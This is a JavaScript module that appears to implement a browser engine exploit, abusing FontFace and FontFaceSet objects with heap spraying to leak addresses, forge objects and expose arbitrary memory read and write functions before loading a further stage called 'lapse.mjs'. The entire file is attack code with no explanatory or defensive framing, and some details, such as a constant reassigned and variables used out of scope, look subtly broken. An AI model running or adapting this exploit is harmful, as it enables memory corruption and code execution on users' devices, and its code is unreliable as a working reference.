const PAGE_SIZE = 16384;
const SIZEOF_CSS_FONT_FACE = 0xb8;
const HASHMAP_BUCKET = 208;
const STRING_OFFSET = 20;
const SPRAY_FONTS = 0x100a;
const GUESS_FONT = 0x200430000;
const NPAGES = 20;
const INVALID_POINTER = 0;
const HAMMER_FONT_NAME = "font8";
const HAMMER_NSTRINGS = 700;

// Funzioni di utilità
function ptrToString(p) {
    let s = '';
    for (let i = 0; i < 8; i++) {
        s += String.fromCharCode(p % 256);
        p = (p - p % 256) / 256;
    }
    return s;
}

function stringToPtr(p, o) {
    if (o === undefined) o = 0;
    let ans = 0;
    for (let i = 7; i >= 0; i--)
        ans = 256 * ans + p.charCodeAt(o + i);
    return ans;
}

// Classe Int64
class Int {
    constructor(low, hi) {
        this.low = low | 0;
        this.hi = hi | 0;
    }

    add(value) {
        const newLow = (this.low + value) | 0;
        const carry = newLow < this.low ? 1 : 0;
        return new Int(newLow, (this.hi + carry) | 0);
    }
}

async function runExploit() {
    const union = new ArrayBuffer(8);
    const union_b = new Uint8Array(union);
    const union_i = new Uint32Array(union);
    const union_f = new Float64Array(union);

    const bad_fonts = [];

    for (let i = 0; i < SPRAY_FONTS; i++)
        bad_fonts.push(new FontFace("font1", "", {}));

    const good_font = new FontFace("font2", "url(data:text/html,)", {});
    bad_fonts.push(good_font);

    const arrays = [];
    for (let i = 0; i < 512; i++)
        arrays.push(new Array(31));

    arrays[256][0] = 1.5;
    arrays[257][0] = {};
    arrays[258][0] = 1.5;

    const jsvalue = {
        a: arrays[256],
        b: new Uint32Array(1),
        c: true
    };

    const string_atomifier = {};
    let string_id = 10000000;
    const strings = [];

    function mkString(l, head) {
        const s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
        string_atomifier[s] = 1;
        strings.push(s);
        return s;
    }

    let guf = GUESS_FONT;
    let ite = true;
    let matches = 0;
    let round = 0;

    const ffses = {};

    let guessed_font = null;
    let guessed_addr = null;

    do {
        let p_s = ptrToString(NPAGES + 2);
        for (let i = 0; i < NPAGES; i++)
            p_s += ptrToString(guf + i * PAGE_SIZE);
        p_s += ptrToString(INVALID_POINTER);

        for (let i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);

        ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);

        const badstr1 = mkString(HASHMAP_BUCKET, p_s);

        guessed_font = null;
        guessed_addr = null;

        for (let i = 0; i < SPRAY_FONTS; i++) {
            bad_fonts[i].family = "search" + round;
            if (badstr1.substr(0, p_s.length) != p_s) {
                guessed_font = i;
                const p_s1 = badstr1.substr(0, p_s.length);
                for (let j = 1; j <= NPAGES; j++) {
                    if (p_s1.substr(j * 8, 8) != p_s.substr(j * 8, 8)) {
                        guessed_addr = stringToPtr(p_s.substr(j * 8, 8));
                        break;
                    }
                }
                if (matches++ == 0) {
                    guf = guessed_addr + 2 * PAGE_SIZE;
                    guessed_addr = null;
                }
                break;
            }
        }

        if ((ite = !ite))
            guf += NPAGES * PAGE_SIZE;

    } while (guessed_addr === null);

    let p_s = '';
    p_s += ptrToString(26);
    p_s += ptrToString(guessed_addr);
    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
    for (let i = 0; i < 19; i++)
        p_s += ptrToString(INVALID_POINTER);

    for (let i = 0; i < 256; i++)
        mkString(HASHMAP_BUCKET, p_s);

    const needfix = [];
    for (let i = 0;; i++) {
        ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
        const badstr2 = mkString(HASHMAP_BUCKET, p_s);
        needfix.push(mkString(HASHMAP_BUCKET, p_s));
        bad_fonts[guessed_font].family = "evil2";
        bad_fonts[guessed_font + 1].family = "evil3";
        const leak = stringToPtr(badstr2.substr(badstr2.length - 8));
        if (leak < 0x1000000000000)
            break;
    }

    function makeReader(read_addr, ffs_name) {
        let fake_s = '';
        fake_s += '0000';
        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff';
        fake_s += ptrToString(read_addr);
        fake_s += ptrToString(0x80000014);
        p_s = '';
        p_s += ptrToString(29);
        p_s += ptrToString(guessed_addr);
        p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
        p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
        for (let i = 0; i < 18; i++)
            p_s += ptrToString(INVALID_POINTER);
        for (let i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);
        const the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
        mkString(HASHMAP_BUCKET, p_s);
        const relative_read = mkString(HASHMAP_BUCKET, fake_s);
        bad_fonts[guessed_font].family = ffs_name + "_evil1";
        bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
        bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
        needfix.push(relative_read);
        if (relative_read.length < 1000)
            return makeReader(read_addr, ffs_name + '_');
        return relative_read;
    }

    const fastmalloc = makeReader(leak, 'ffs3');

    for (let i = 0; i < 100000; i++)
        mkString(128, '');

    const props = [];
    for (let i = 0; i < 0x10000; i++) {
        props.push({ value: 0x41434442 });
        props.push({ value: jsvalue });
    }

    let jsvalue_leak = null;

    while (jsvalue_leak === null) {
        Object.defineProperties({}, props);
        for (let i = 0;; i++) {
            if (fastmalloc.charCodeAt(i) == 0x42 &&
                fastmalloc.charCodeAt(i + 1) == 0x44 &&
                fastmalloc.charCodeAt(i + 2) == 0x43 &&
                fastmalloc.charCodeAt(i + 3) == 0x41 &&
                fastmalloc.charCodeAt(i + 4) == 0 &&
                fastmalloc.charCodeAt(i + 5) == 0 &&
                fastmalloc.charCodeAt(i + 6) == 254 &&
                fastmalloc.charCodeAt(i + 7) == 255 &&
                fastmalloc.charCodeAt(i + 24) == 14
            ) {
                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
                break;
            }
        }
    }

    const rd_leak = makeReader(jsvalue_leak, 'ffs4');
    const array256 = stringToPtr(rd_leak, 16);
    const ui32a = stringToPtr(rd_leak, 24);

    const rd_arr = makeReader(array256, 'ffs5');
    const butterfly = stringToPtr(rd_arr, 8);

    const rd_ui32 = makeReader(ui32a, 'ffs6');
    for (let i = 0; i < 8; i++)
        union_b[i] = rd_ui32.charCodeAt(i);

    const structureid_low = union_i[0];
    const structureid_high = union_i[1];

    union_i[0] = 0x10000;
    union_i[1] = 0;
    arrays[257][1] = {};
    arrays[257][0] = union_f[0];
    union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
    union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
    arrays[256][0] = union_f[0];

    let pp_s = '';
    pp_s += ptrToString(56);
    for (let i = 0; i < 12; i++)
        pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);

    let fake_s = '';
    fake_s += '0000';
    fake_s += ptrToString(INVALID_POINTER);
    fake_s += ptrToString(butterfly);
    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';

    const ffs7_args = [];
    for (let i = 0; i < 12; i++)
        ffs7_args.push(bad_fonts[guessed_font + i]);
    ffs7_args.push(good_font);

    const ffs8_args = [bad_fonts[guessed_font + 12]];
    for (let i = 0; i < 5; i++)
        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));

    for (let i = 0; i < HAMMER_NSTRINGS; i++)
        mkString(HASHMAP_BUCKET, pp_s);

    ffses.ffs7 = new FontFaceSet(ffs7_args);
    mkString(HASHMAP_BUCKET, pp_s);
    ffses.ffs8 = new FontFaceSet(ffs8_args);
    const post_ffs = mkString(HASHMAP_BUCKET, fake_s);
    needfix.push(post_ffs);

    for (let i = 0; i < 13; i++)
        bad_fonts[guessed_font + i].family = "hammer" + i;

    function boot_addrof(obj) {
        arrays[257][32] = obj;
        union_f[0] = arrays[258][0];
        return union_i[1] * 0x100000000 + union_i[0];
    }

    function boot_fakeobj(addr) {
        union_i[0] = addr;
        union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
        arrays[258][0] = union_f[0];
        return arrays[257][32];
    }

    const arw_master = new Uint32Array(8);
    const arw_slave = new Uint8Array(1);
    const obj_master = new Uint32Array(8);
    const obj_slave = { obj: null };

    const addrof_slave = boot_addrof(arw_slave);
    const addrof_obj_slave = boot_addrof(obj_slave);
    union_i[0] = structureid_low;
    union_i[1] = structureid_high;
    union_b[6] = 7;
    const obj = {
        jscell: union_f[0],
        butterfly: true,
        buffer: arw_master,
        size: 0x5678
    };

    function i48_put(x, a) {
        a[4] = x | 0;
        a[5] = (x / 4294967296) | 0;
    }

    function i48_get(a) {
        return a[4] + a[5] * 4294967296;
    }

    window.addrof = function (x) {
        obj_slave.obj = x;
        return i48_get(obj_master);
    }

    window.fakeobj = function (x) {
        i48_put(x, obj_master);
        return obj_slave.obj;
    }

    function read_mem_setup(p, sz) {
        i48_put(p, arw_master);
        arw_master[6] = sz;
    }

    window.read_mem = function (p, sz) {
        read_mem_setup(p, sz);
        const arr = [];
        for (let i = 0; i < sz; i++)
            arr.push(arw_slave[i]);
        return arr;
    };

    window.write_mem = function (p, data) {
        read_mem_setup(p, data.length);
        for (let i = 0; i < data.length; i++)
            arw_slave[i] = data[i];
    };

    window.read_ptr_at = function (p) {
        let ans = 0;
        const d = read_mem(p, 8);
        for (let i = 7; i >= 0; i--)
            ans = 256 * ans + d[i];
        return ans;
    };

    window.write_ptr_at = function (p, d) {
        const arr = [];
        for (let i = 0; i < 8; i++) {
            arr.push(d & 0xff);
            d /= 256;
        }
        write_mem(p, arr);
    };

    (function () {
        const magic = boot_fakeobj(boot_addrof(obj) + 16);
        magic[4] = addrof_slave;
        magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
        obj.buffer = obj_master;
        magic[4] = addrof_obj_slave;
        magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
        magic = null;
    })();

    (function () {
        const ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
        write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
        for (let i = 0; i < needfix.length; i++) {
            const addr = read_ptr_at(addrof(needfix[i]) + 8);
            write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
            write_ptr_at(addr + 8, addr + 20);
            write_ptr_at(addr + 16, 0x80000014);
        }
        write_ptr_at(butterfly + 248, 0x1f0000001f);
    })();

    const expl_master = new Uint32Array(new ArrayBuffer(1));
    const expl_slave = new DataView(new ArrayBuffer(1));

    const addrof_expl_slave = addrof(expl_slave);
    let m = fakeobj(addrof(obj) + 16);
    obj.buffer = expl_slave;
    m[7] = 1;
    obj.buffer = expl_master;
    m[4] = addrof_expl_slave;
    m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
    m[7] = 1;

    async function load_lapse() {
        const mod = await import('./module/mem.mjs');
        const imod = await import('./module/int64.mjs');
        const Memory = mod.Memory;
        const obj = { addr: null, 0: 0 };
        let obj_p = addrof(obj);
        const obj_bt = read64(obj_p.add(8));
        obj_p = new imod.Int(obj_p.low, obj_p.hi);
        const obj_bt_int = new imod.Int(obj_bt.low, obj_bt.hi);
        new Memory(expl_master, expl_slave, obj, obj_p.add(0x10), obj_bt_int);
        await import('./lapse.mjs');
    }

    await load_lapse();
}

export default runExploit;
